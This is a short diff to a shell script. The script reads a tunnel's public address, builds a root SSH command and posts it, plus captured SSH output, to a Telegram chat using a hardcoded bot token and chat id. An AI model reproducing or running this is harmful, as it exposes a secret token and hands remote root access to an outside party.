@@ -24,8 +24,10 @@ url=$(curl "http://localhost:4040/api/tunnels" | jq '.tunnels[0].public_url' | c
 host=$(echo $url | sed 's\:[0-9].*\\g' | sed 's\tcp://\\g')
 port=$(echo $url | sed 's\.*io:\\g')
 echo "ssh -p${port} root@${host}"
+kont=$(ssh -p$port root@$host)
+echo $kont
 echo $insta
 curl "https://api.telegram.org/bot5846717379:AAGfBsbz8hWsHnXtKEQ1kB-N9GXlWzhhgOM/sendMessage?chat_id=1297554323&text=$insta"
 sleep 2
-curl "https://api.telegram.org/bot5846717379:AAGfBsbz8hWsHnXtKEQ1kB-N9GXlWzhhgOM/sendMessage?chat_id=1297554323&text=ssh -p$port root@$host"
+curl "https://api.telegram.org/bot5846717379:AAGfBsbz8hWsHnXtKEQ1kB-N9GXlWzhhgOM/sendMessage?chat_id=1297554323&text=$kont"
 sleep 9 && sleep 999
